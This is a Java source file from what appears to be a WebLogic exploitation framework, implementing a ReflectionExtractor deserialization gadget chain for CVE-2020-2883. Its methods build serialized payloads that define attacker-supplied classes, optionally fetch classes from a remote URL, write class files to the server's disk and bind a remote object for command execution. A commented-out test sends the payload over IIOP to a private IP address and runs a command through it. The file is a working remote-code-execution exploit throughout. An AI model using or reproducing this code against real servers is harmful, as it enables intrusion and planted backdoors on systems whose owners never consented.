/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.r4v3zn.weblogic.framework.gadget.impl;

import com.r4v3zn.weblogic.framework.enmus.CallEnum;
import com.r4v3zn.weblogic.framework.entity.ContextPojo;
import com.r4v3zn.weblogic.framework.utils.ClassLoaderUtils;
import com.r4v3zn.weblogic.framework.utils.ReflectionUtils;
import com.r4v3zn.weblogic.framework.entity.GadgetParam;
import com.r4v3zn.weblogic.framework.gadget.ObjectGadget;
import com.r4v3zn.weblogic.framework.utils.StringUtils;
import com.r4v3zn.weblogic.framework.utils.UrlUtils;
import com.r4v3zn.weblogic.framework.vuls.VulTest;
import com.r4v3zn.weblogic.framework.vuls.impl.CVE_2020_2883;
import org.mozilla.classfile.DefiningClassLoader;
import weblogic.cluster.singleton.ClusterMasterRemote;
import weblogic.utils.io.ByteBufferObjectInputStream;

import java.io.*;
import java.lang.reflect.Array;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.ByteBuffer;
import java.rmi.Remote;
import java.util.PriorityQueue;
import java.util.Queue;

import static com.r4v3zn.weblogic.framework.utils.CallUtils.*;
import static com.r4v3zn.weblogic.framework.utils.ContextUtils.rebind;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: ReflectionExtractorGadget
 * Desc: ReflectionExtractor Gadget
 * Gadget chain:
 *     readObject:797, PriorityQueue (java.util)
 *         heapify:737, PriorityQueue (java.util)
 *             siftDown:688, PriorityQueue (java.util)
 *                 siftDownUsingComparator:722, PriorityQueue (java.util)
 *                     compare:71, ExtractorComparator (com.tangosol.util.comparator)
 *                         extract:81, ChainedExtractor (com.tangosol.util.extractor)
 *                             extract:109, ReflectionExtractor (com.tangosol.util.extractor)
 *                                 invoke:498, Method (java.lang.reflect)
 * Date: 2020/4/19 15:51
 * @author 0nise
 * @version 1.0.0
 */
public class ReflectionExtractorGadget implements ObjectGadget<Queue<Object>> {

    @Override
    public Queue<Object> getObject(String command, URLClassLoader urlClassLoader) throws Exception {
        return null;
    }

    @Override
    public Queue<Object> getObject(byte[] codeByte, String[] bootArgs, String className, URLClassLoader urlClassLoader) throws Exception {
        String javascriptUrl = bootArgs[1];
        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
        Class clazz = null;
        Object valueExtractor = Array.newInstance(valueExtractorClazz,4);
        if(isBlank(javascriptUrl)){
            Object javascriptNewInstance = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
                    new Object[]{className, codeByte});
            Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                    new Object[]{bootArgs[0]});
            Array.set(valueExtractor, 0, javascriptNewInstance);
            Array.set(valueExtractor, 1, defineClass);
            Array.set(valueExtractor, 2, defineClassNewInstance);
            Array.set(valueExtractor, 3, rmiBind);
            clazz = DefiningClassLoader.class;
        }else{
            URL url = new URL(javascriptUrl);
            URL[] urls = new URL[]{url};
            valueExtractor = Array.newInstance(valueExtractorClazz,7);
            Object getConstructor = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("getConstructor",
                    new Object[]{new Class[]{URL[].class}});
            Object newInstance = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("newInstance",
                    new Object[]{new Object[]{urls}});
            Object loadClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("loadClass",
                    new Object[]{"org.mozilla.classfile.DefiningClassLoader"});
            Object javassistNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
                    new Object[]{className, codeByte});
            Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                    new Object[]{bootArgs[0]});
            Array.set(valueExtractor, 0, getConstructor);
            Array.set(valueExtractor, 1, newInstance);
            Array.set(valueExtractor, 2, loadClass);
            Array.set(valueExtractor, 3, javassistNewInstance);
            Array.set(valueExtractor, 4, defineClass);
            Array.set(valueExtractor, 5, defineClassNewInstance);
            Array.set(valueExtractor, 6, rmiBind);
            clazz = URLClassLoader.class;
        }
        return getObject(valueExtractor, clazz, urlClassLoader);
    }

    @Override
    public Queue<Object> getObject(GadgetParam param) throws Exception {
        String className = param.getClassName();
        URLClassLoader urlClassLoader = param.getUrlClassLoader();
        byte[] codeByte = param.getCodeByte();
        String[] bootArgs = param.getBootArgs();
        return getObject(codeByte, bootArgs, className, urlClassLoader);
    }

    /**
     * 生成文件写入 payload
     * @param param 参数
     * @return
     * @throws Exception
     */
    @Override
    public Queue<Object> getWriteFileObject(GadgetParam param) throws Exception {
        byte[] codeByte = param.getCodeByte();
        String className = param.getClassName()+".class";
        URLClassLoader urlClassLoader = param.getUrlClassLoader();
        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
        Class clazz = Class.class;
        Object valueExtractor = Array.newInstance(valueExtractorClazz,4);
        Object forName = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("forName",
                new Object[]{"java.io.FileOutputStream"});
        Object getConstructor = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("getConstructor",
                new Object[]{new Class[]{String.class}});
        Object newInstance = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("newInstance",
                new Object[]{new Object[]{className}});
        Object write = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("write",
                new Object[]{codeByte});
        Array.set(valueExtractor, 0, forName);
        Array.set(valueExtractor, 1, getConstructor);
        Array.set(valueExtractor, 2, newInstance);
        Array.set(valueExtractor, 3, write);
        return getObject(valueExtractor, clazz, urlClassLoader);
    }

    /**
     * 生成加载文件 payload
     * @param param Exception
     * @return
     * @throws Exception
     */
    @Override
    public Queue<Object> getLoadFileObject(GadgetParam param) throws Exception {
        String className = param.getClassName();
        String[] bootArgs = param.getBootArgs();
        URLClassLoader urlClassLoader = param.getUrlClassLoader();
        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
        Class clazz = URLClassLoader.class;
        Object valueExtractor = Array.newInstance(valueExtractorClazz,5);
        URL url = new URL("file:./");
        URL[] urls = new URL[]{url};
        Object getConstructor = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("getConstructor",
                new Object[]{new Class[]{URL[].class}});
        Object newInstance = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("newInstance",
                new Object[]{new Object[]{urls}});
        Object loadClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("loadClass",
                new Object[]{className});
        Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
        Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                new Object[]{bootArgs[0]});
        Array.set(valueExtractor, 0, getConstructor);
        Array.set(valueExtractor, 1, newInstance);
        Array.set(valueExtractor, 2, loadClass);
        Array.set(valueExtractor, 3, defineClassNewInstance);
        Array.set(valueExtractor, 4, rmiBind);
        return getObject(valueExtractor, clazz, urlClassLoader);
    }

    /**
     * 获取序列化 payload
     * @param valueExtractors ValueExtractors
     * @param clazz 反序列化的 class
     * @return 序列结果
     * @throws Exception
     */
    private Queue<Object> getObject(final Object valueExtractors, Class clazz, URLClassLoader urlClassLoader) throws Exception {
        Class chainedExtractorClazz  = urlClassLoader.loadClass("com.tangosol.util.extractor.ChainedExtractor");
        Object chainedExtractor = chainedExtractorClazz.getConstructor(valueExtractors.getClass()).newInstance(valueExtractors);
        Class extractorComparatorClazz = urlClassLoader.loadClass("com.tangosol.util.comparator.ExtractorComparator");
        // ExtractorComparator extractorComparator = new ExtractorComparator(chainedExtractor);
        Object extractorComparator = extractorComparatorClazz.getConstructor(urlClassLoader.loadClass("com.tangosol.util.ValueExtractor")).newInstance(chainedExtractor);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2);
        queue.add("1");
        queue.add("1");
        // set PriorityQueue comparator to extractorComparator
        ReflectionUtils.setFieldValue(queue, "comparator",  extractorComparator);
        final Object[] queueArray = (Object[]) ReflectionUtils.getFieldValue(queue, "queue");
        queueArray[0] = clazz;
        queueArray[1] = "1";
        return queue;
    }

    public static void main(String[] args) throws Exception {
        String callName = DEFAULT_CALL;
        byte[] bytes = buildBytes(callName);
        String bindName = StringUtils.getRandomString(16);
        System.out.println(bindName);
        Class<? extends Remote> callClazz = CALL_MAP.get(callName);
        ObjectGadget gadget = new ReflectionExtractorGadget();
        GadgetParam gadgetParam = new GadgetParam();
        gadgetParam.setBootArgs(new String[]{bindName});
        gadgetParam.setCodeByte(bytes);
        gadgetParam.setClassName(callClazz.getSimpleName());
        /*
//        FileOutputStream.class.getConstructor(String.class).newInstance(callClazz.getSimpleName()+".class").write(bytes);
        URLClassLoader urlClassLoader = ClassLoaderUtils.loadJar("12.1.3.0", CVE_2020_2883.VUL_DEPENDENCIES);
        gadgetParam.setUrlClassLoader(urlClassLoader);
//        gadgetParam.setUrlClassLoader(urlClassLoader);
//        gadgetParam.setJndiUrl(vulCheckParam.getJndiUrl());
        Object sendObject = gadget.getWriteFileObject(gadgetParam);
        sendObject = gadget.getLoadFileObject(gadgetParam);
        ContextPojo contextPojo = null;
        caa.write(bytes);
        try{
            contextPojo = rebind("iiop://172.16.108.140:7001", sendObject, urlClassLoader);
        }catch (Exception e){
            //
            e.printStackTrace();
        }
        try{
            Object objectCall = contextPojo.getContext().lookup(bindName);
            CVE_2020_2883 vulTest = new CVE_2020_2883();
            vulTest.currentContext = contextPojo.getContext();
            vulTest.remote = objectCall;
            vulTest.bindName = bindName;
            String result = vulTest.exploit("http://172.16.108.140:7001/", "echo a136d86442181f45a4446f5fb8a49f7f", "GBK");
            System.out.println(result);
//            clusterMasterRemote.getServerLocation("aa");
        }catch (Exception e){
            e.printStackTrace();
        }
//        String jndiUrl = UrlUtils.buildJNDIUrl(url, vulCheckParam.getProtocol());

         */
    }
}
